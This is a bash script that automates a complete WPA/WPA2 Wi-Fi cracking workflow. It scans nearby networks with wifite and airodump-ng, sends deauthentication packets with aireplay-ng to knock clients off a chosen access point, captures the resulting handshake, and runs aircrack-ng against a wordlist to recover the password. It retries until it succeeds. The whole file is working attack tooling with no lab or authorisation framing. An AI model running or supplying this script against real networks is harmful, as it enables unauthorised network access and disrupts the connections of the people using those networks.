#!/bin/bash

# Color definitions for messages
GREEN="\e[32m"   # Success/Positive outcomes
RED="\e[31m"     # Errors/Warnings
BLUE="\e[34m"    # Information/System calls
RESET="\e[0m"    # Reset color

# Log file setup
LOG_FILE="script.log"
OUTPUT_DIR="captures"
mkdir -p $OUTPUT_DIR

echo "Log File: $LOG_FILE"
echo "Script started at: $(date)" > $LOG_FILE

# Function for logging and displaying messages
log_msg() {
    local level=$1
    local message=$2
    local color=$3
    echo -e "${color}[$level] $message${RESET}"
    echo "[$level] $message" >> $LOG_FILE
}

# Check for necessary tools
check_tools() {
    local tools=("wifite" "airodump-ng" "aireplay-ng" "aircrack-ng")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            log_msg "!" "$tool is not installed. Please install it." $RED
            exit 1
        fi
    done
}

# Perform an initial scan
initial_scan() {
    log_msg "+" "Performing initial scan with Wifite..." $BLUE
    sudo wifite -all
    log_msg "+" "Initial scan complete." $GREEN
}

# Scan for networks
scan_networks() {
    log_msg "+" "Scanning for nearby Wi-Fi networks..." $BLUE
    sudo airodump-ng wlan0
    log_msg "+" "Nearby Wi-Fi networks scanned." $GREEN
}

# Focused scan
focused_scan() {
    read -p "Enter the channel number: " channel
    if [[ ! $channel =~ ^[0-9]+$ ]]; then
        log_msg "!" "Invalid channel number." $RED
        return 1
    fi

    read -p "Enter the AP MAC address: " ap_mac
    log_msg "+" "Scanning a specific channel and saving output to file..." $BLUE
    sudo airodump-ng -c $channel -w $OUTPUT_DIR/airdump.txt -d $ap_mac wlan0
    log_msg "+" "Specific channel scan complete. Output saved to $OUTPUT_DIR/airdump.txt." $GREEN
    return 0
}

# Deauthentication attack
deauth_attack() {
    read -p "Enter the AP MAC address: " ap_mac
    read -p "Enter the channel number: " channel

    log_msg "+" "Sending deauthentication packets to the target AP..." $BLUE
    sudo aireplay-ng -0 10 -a $ap_mac wlan0
    log_msg "+" "Deauthentication packets sent." $GREEN

    log_msg "+" "Capturing handshake packets..." $BLUE
    sudo airodump-ng -w $OUTPUT_DIR/deauth_capture -c $channel -d $ap_mac wlan0
    if [[ $? -eq 0 ]]; then
        log_msg "+" "Handshake captured successfully. Output saved to $OUTPUT_DIR/deauth_capture." $GREEN
        return 0
    else
        log_msg "!" "Failed to capture handshake. Retrying..." $RED
        return 1
    fi
}

# Cracking the password
crack_password() {
    read -p "Enter the path to the wordlist file: " wordlist
    if [[ ! -f $wordlist ]]; then
        log_msg "!" "Wordlist file not found." $RED
        return 1
    fi

    log_msg "+" "Cracking the WPA/WPA2 password..." $BLUE
    sudo aircrack-ng $OUTPUT_DIR/deauth_capture-01.cap -w $wordlist
    if [[ $? -eq 0 ]]; then
        log_msg "+" "Password cracked successfully!" $GREEN
        return 0
    else
        log_msg "!" "Password cracking failed. Retrying..." $RED
        return 1
    fi
}

# Main script logic
main() {
    check_tools
    initial_scan
    scan_networks

    while true; do
        if focused_scan && deauth_attack && crack_password; then
            log_msg "+" "Operation completed successfully!" $GREEN
            break
        else
            log_msg "!" "Retrying the operation..." $RED
        fi
    done
}

# Run the main function
main
